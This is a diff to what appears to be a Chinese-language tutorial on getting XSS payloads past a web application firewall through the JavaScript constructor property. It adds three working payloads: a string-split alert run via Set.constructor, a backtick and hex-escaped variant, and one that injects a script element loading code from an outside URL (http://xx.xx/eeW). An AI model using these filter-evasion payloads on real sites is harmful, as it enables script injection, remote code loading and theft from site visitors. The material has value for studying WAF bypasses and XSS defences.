@@ -200,8 +200,39 @@ waf拦截
 ![27](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yf7nce1dj30fe0620ss.jpg)
 
 ### constructor属性
+- - -
 
 ![28](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yk1fdzqmj30fh07idfu.jpg)
 
+少年!Post到什么了没有。
+
+![29](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yk4ibtegj30m3047weh.jpg)
+
+又是拆分。。注意后面的`()`
+
+```html
+<svg/onload=Set.constructor('al'%2b'ert(1)')()>
+```
+![30](https://ws1.sinaimg.cn/large/005DAKuvgy1g1yk7bt75gj30uj09a3z9.jpg)
+
+反引号我看行。。注意后面2个反引号。
+
+```html
+<svg/onload=Set.constructor`al\x65rt\x28/xss/\x29```>
+```
+![31](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykdta6tvj30uj0943z9.jpg)
+
+又来引用外部url。编码拆分以及结合函数，请参考上章= =，不然我怕有人说我水。。。
+
+![33](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykjq4xx5j30k00ha3z9.jpg)
+
+```html
+<svg/onload=Set.constructor(appendChild(createElement('script')).src='http://xx.xx/eeW')()>
+```
+![32](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ykhi14qsj30uj0b63zz.jpg)
+
+### 补充(又是补充，你**就不能一次讲完嘛!写个文章还划水!)
+- - -
+咳咳，该补充的还是要补充的，除了 Set 对象还有嘛？当然有的。
 
 
